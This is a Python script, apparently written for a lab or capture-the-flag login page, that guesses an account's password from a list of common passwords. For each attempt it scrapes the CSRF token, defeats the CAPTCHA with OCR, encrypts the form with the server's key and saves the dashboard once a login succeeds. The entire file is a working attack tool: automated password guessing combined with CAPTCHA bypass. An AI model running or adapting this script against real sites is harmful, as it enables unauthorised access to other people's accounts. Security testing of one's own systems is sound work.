import io
import json
import os
import time
from base64 import b64decode, b64encode
from pathlib import Path

import pytesseract
import requests
from bs4 import BeautifulSoup
from Cryptodome.Cipher import PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from PIL import Image, ImageOps


BASE_URL = os.environ.get("CAPTCHA_BASE_URL", "").rstrip("/")
USERNAME = os.environ.get("CAPTCHA_USERNAME", "admin")
PASSWORD_FILE = Path(os.environ.get("CAPTCHA_PASSWORD_FILE", "top100.txt"))
SERVER_PUBLIC_KEY_FILE = Path(
    os.environ.get("CAPTCHA_SERVER_PUBLIC_KEY", "keys/server-public.pem")
)
CLIENT_PRIVATE_KEY_FILE = Path(
    os.environ.get("CAPTCHA_CLIENT_PRIVATE_KEY", "keys/client-private.pem")
)

TRY_LIMIT = 100
REQUEST_TIMEOUT = 10
DELAY_BETWEEN_ATTEMPTS = 0.3


def endpoint(path: str) -> str:
    return f"{BASE_URL}/{path.lstrip('/')}"


def read_key(path: Path, label: str) -> bytes:
    try:
        return path.read_bytes()
    except FileNotFoundError as exc:
        raise ValueError(f"{label} not found: {path}") from exc


def encrypt_payload(data: str) -> str:
    public_key = RSA.import_key(read_key(SERVER_PUBLIC_KEY_FILE, "Server public key"))
    cipher = PKCS1_v1_5.new(public_key)
    return b64encode(cipher.encrypt(data.encode())).decode()


def decrypt_response(enc_data: str) -> str:
    private_key = RSA.import_key(read_key(CLIENT_PRIVATE_KEY_FILE, "Client private key"))
    cipher = PKCS1_v1_5.new(private_key)
    decrypted = cipher.decrypt(b64decode(enc_data), None)
    if not decrypted:
        return "Decryption failed"
    return decrypted.decode(errors="replace")


def get_csrf_token(session: requests.Session) -> str:
    response = session.get(endpoint("index.php"), timeout=REQUEST_TIMEOUT)
    response.raise_for_status()
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "csrf_token"})
    return token.get("value", "") if token else ""


def fetch_captcha(session: requests.Session) -> Image.Image:
    response = session.get(endpoint("captcha.php"), timeout=REQUEST_TIMEOUT)
    response.raise_for_status()
    return Image.open(io.BytesIO(response.content))


def solve_captcha(session: requests.Session) -> str:
    image = fetch_captcha(session).convert("L")
    image = ImageOps.autocontrast(image)
    image = image.point(lambda value: 0 if value < 140 else 255, "1")
    text = pytesseract.image_to_string(image, config="--psm 7").strip()
    return "".join(character for character in text if character.isalnum())


def build_form_data(
    csrf_token: str, username: str, password: str, captcha_text: str
) -> str:
    return (
        f"action=login&csrf_token={csrf_token}"
        f"&username={username}"
        f"&password={password}"
        f"&captcha_input={captcha_text}"
    )


def attempt_login(session: requests.Session, username: str, password: str) -> str:
    csrf_token = get_csrf_token(session)
    if not csrf_token:
        return "Missing CSRF token"

    captcha_text = solve_captcha(session)
    if not captcha_text:
        return "CAPTCHA OCR failed"

    encrypted_data = encrypt_payload(
        build_form_data(csrf_token, username, password, captcha_text)
    )
    response = session.post(
        endpoint("server.php"),
        json={"data": encrypted_data},
        headers={"Content-Type": "application/json"},
        timeout=REQUEST_TIMEOUT,
    )
    response.raise_for_status()

    try:
        parsed = response.json()
    except json.JSONDecodeError:
        return "Invalid JSON response"
    if "data" not in parsed:
        return "No encrypted response data returned"
    return decrypt_response(parsed["data"])


def load_passwords(path: Path, limit: int) -> list[str]:
    with path.open("r", encoding="utf-8", errors="ignore") as handle:
        return [line.strip() for line in handle if line.strip()][:limit]


def main() -> None:
    if not BASE_URL:
        print("Set CAPTCHA_BASE_URL before running the script.")
        return

    try:
        passwords = load_passwords(PASSWORD_FILE, TRY_LIMIT)
    except FileNotFoundError:
        print(f"Password file not found: {PASSWORD_FILE}")
        return
    if not passwords:
        print("No passwords loaded.")
        return

    session = requests.Session()
    for index, password in enumerate(passwords, start=1):
        print(f"[{index}/{len(passwords)}] Trying candidate")
        try:
            result = attempt_login(session, USERNAME, password)
            print(f"  {result}")
            if "Login successful" in result:
                dashboard = session.get(endpoint("dashboard.php"), timeout=REQUEST_TIMEOUT)
                dashboard.raise_for_status()
                Path("dashboard.html").write_text(dashboard.text, encoding="utf-8")
                print("Login succeeded; dashboard saved to dashboard.html")
                return
        except requests.RequestException as exc:
            print(f"  HTTP error: {exc}")
        except ValueError as exc:
            print(f"  Configuration or key error: {exc}")
        time.sleep(DELAY_BETWEEN_ATTEMPTS)

    print("Finished without a successful login.")


if __name__ == "__main__":
    main()
